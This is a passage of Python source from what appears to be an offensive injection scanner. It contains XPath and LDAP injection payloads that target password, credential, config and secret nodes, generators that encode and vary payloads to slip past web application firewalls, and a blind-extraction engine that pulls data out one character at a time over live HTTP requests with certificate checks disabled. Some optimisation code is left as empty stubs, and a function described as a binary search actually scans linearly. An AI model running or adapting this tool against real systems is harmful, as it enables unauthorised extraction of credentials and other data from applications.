            "' | //* | '",                          # All elements
            "' | //text() | '",                     # All text nodes
            "' | //@* | '",                         # All attributes
            "' or name()='root' or ''='",           # Enumerate node names
            "' or string-length(name(/*))>0 or ''='",  # Check root exists
            "' | //user/password | '",              # Common sensitive paths
            "' | //credentials | '",
            "' | //config | '",
            "' | //secret | '",
        ]
    
    def _generate_xpath_waf_bypass(self, base_payloads: list) -> list[str]:
        """Generate WAF bypass variants for XPath"""
        bypasses = []
        
        for payload in base_payloads[:5]:
            # URL encoding
            bypasses.append(urllib.parse.quote(payload))
            
            # Double URL encoding  
            bypasses.append(urllib.parse.quote(urllib.parse.quote(payload)))
            
            # Case variations
            bypasses.append(payload.replace(' or ', ' OR '))
            bypasses.append(payload.replace(' or ', ' Or '))
            
            # Whitespace variations
            bypasses.append(payload.replace(' ', '\t'))
            bypasses.append(payload.replace(' ', '\n'))
            bypasses.append(payload.replace(' ', '  '))  # Double space
            
            # String function bypass
            if "'" in payload:
                # Replace ' with concat("'","")
                bypasses.append(payload.replace("'", "'+''+'"))
            
            # Comment injection (if XPath 2.0)
            bypasses.append(payload.replace(' or ', ' (: comment :) or '))
        
        return bypasses
    
    def _generate_xpath_operator_variations(self) -> list[str]:
        """Generate payloads with different XPath operators"""
        return [
            "' and '1'='1",
            "' and ''='",
            "' or not(false()) or ''='",
            "' or true() or ''='",
            "' or 1 or ''='",
            "' or 0=0 or ''='",
            "' or 'x'='x",
            '" and "1"="1',
            "' != '' or ''='",
            "' < 'z' or ''='",
        ]
    
    # ─────────────────────────────────────────────────────────────────────
    # BLIND INJECTION PAYLOADS
    # ─────────────────────────────────────────────────────────────────────
    
    def generate_blind_ldap_payloads(self, target_attr: str, position: int, char: str) -> str:
        """Generate blind LDAP payload for character extraction"""
        # Try to extract character at position from target attribute
        return f'*)({target_attr}={char}*'
    
    def generate_blind_xpath_payloads(self, xpath_expr: str, position: int, char: str) -> list[str]:
        """Generate blind XPath payloads for character extraction"""
        return [
            f"' or substring({xpath_expr},{position},1)='{char}' and ''='",
            f"' or contains({xpath_expr},'{char}') and ''='",
            f"' or starts-with(substring({xpath_expr},{position}),'{char}') and ''='",
        ]
    
    def generate_length_check_payloads(self, xpath_expr: str, max_len: int = 50) -> list[str]:
        """Generate payloads to determine string length"""
        payloads = []
        for length in [1, 5, 10, 15, 20, 25, 30, 40, 50]:
            if length <= max_len:
                payloads.append(f"' or string-length({xpath_expr})>{length} and ''='")
                payloads.append(f"' or string-length({xpath_expr})={length} and ''='")
        return payloads
    
    # ─────────────────────────────────────────────────────────────────────
    # ADAPTIVE LEARNING
    # ─────────────────────────────────────────────────────────────────────
    
    def learn_from_response(self, payload: str, response: str, success: bool):
        """Learn from injection attempts to improve future payloads"""
        if success:
            self.successful_payloads.append(payload)
            
            # Extract patterns from successful payload
            if '*' in payload:
                self.learned_patterns['wildcard_works'] = True
            if 'or' in payload.lower():
                self.learned_patterns['or_works'] = True
            if '|' in payload:
                self.learned_patterns['union_works'] = True
        else:
            # Check if blocked by WAF
            waf_indicators = ['blocked', 'forbidden', 'waf', 'firewall', '403', 'denied']
            if any(ind in response.lower() for ind in waf_indicators):
                self.blocked_patterns.append(payload)
    
    def get_optimized_payloads(self, injection_type: str) -> list[str]:
        """Get optimized payloads based on learned patterns"""
        if injection_type == 'ldap':
            base = self.generate_ldap_payloads({'learned': self.learned_patterns})
        else:
            base = self.generate_xpath_payloads({'learned': self.learned_patterns})
        
        # Prioritize patterns similar to successful ones
        if self.successful_payloads:
            # Move similar payloads to front
            pass
        
        # Remove patterns similar to blocked ones
        if self.blocked_patterns:
            # Filter out blocked patterns
            pass
        
        return base


class BlindExtractionEngine:
    """
    Engine for extracting data via blind injection.
    Uses binary search and adaptive character sets.
    """
    
    def __init__(self, scanner: 'InjectionScanner'):
        self.scanner = scanner
        self.generator = DynamicPayloadGenerator()
    
    def extract_string_blind_xpath(
        self, 
        target: ScanTarget, 
        xpath_expr: str,
        max_length: int = 100
    ) -> str:
        """Extract a string value via blind XPath injection"""
        
        # First, determine length
        length = self._determine_length(target, xpath_expr, max_length)
        if length == 0:
            return ""
        
        self.scanner.log(f"Blind extraction: detected length {length}")
        
        # Extract character by character
        result = []
        charset = DynamicPayloadGenerator.CHARSET_COMMON + DynamicPayloadGenerator.CHARSET_NUMERIC
        
        for pos in range(1, length + 1):
            char = self._extract_char_binary(target, xpath_expr, pos, charset)
            if char:
                result.append(char)
                self.scanner.log(f"Position {pos}: '{char}'")
            else:
                result.append('?')
        
        return ''.join(result)
    
    def _determine_length(self, target: ScanTarget, xpath_expr: str, max_len: int) -> int:
        """Binary search to find string length"""
        low, high = 0, max_len
        
        while low < high:
            mid = (low + high + 1) // 2
            payload = f"' or string-length({xpath_expr})>={mid} and ''='"
            
            if self._test_condition(target, payload):
                low = mid
            else:
                high = mid - 1
        
        return low
    
    def _extract_char_binary(
        self, 
        target: ScanTarget, 
        xpath_expr: str, 
        position: int,
        charset: str
    ) -> str:
        """Binary search to find character at position"""
        
        # First try common characters
        for char in charset[:20]:  # Most common first
            payload = f"' or substring({xpath_expr},{position},1)='{char}' and ''='"
            if self._test_condition(target, payload):
                return char
        
        # Fall back to full charset
        for char in charset[20:]:
            payload = f"' or substring({xpath_expr},{position},1)='{char}' and ''='"
            if self._test_condition(target, payload):
                return char
        
        return None
    
    def _test_condition(self, target: ScanTarget, payload: str) -> bool:
        """Test if a blind condition is true"""
        try:
            parsed = urllib.parse.urlparse(target.url)
            base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
            
            # Get baseline (false condition)
            false_params = target.params.copy()
            first_param = list(false_params.keys())[0]
            false_params[first_param] = "' or '1'='2"
            
            false_resp = self.scanner.session.get(
                base_url,
                params=false_params,
                timeout=REQUEST_TIMEOUT,
                verify=False
            )
            false_len = len(false_resp.text)
            
            # Test actual condition
            test_params = target.params.copy()
            test_params[first_param] = payload
            
            test_resp = self.scanner.session.get(
                base_url,
                params=test_params,
                timeout=REQUEST_TIMEOUT,
                verify=False
            )
            test_len = len(test_resp.text)
            
            # True if response differs significantly from false baseline
            return abs(test_len - false_len) > 50
            
        except Exception:
            return False

# ─────────────────────────────────────────────────────────────────────────────
# ENTRY POINT
# ─────────────────────────────────────────────────────────────────────────────

if __name__ == '__main__':
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    
    scanner = InjectionScanner()
    scanner.run()
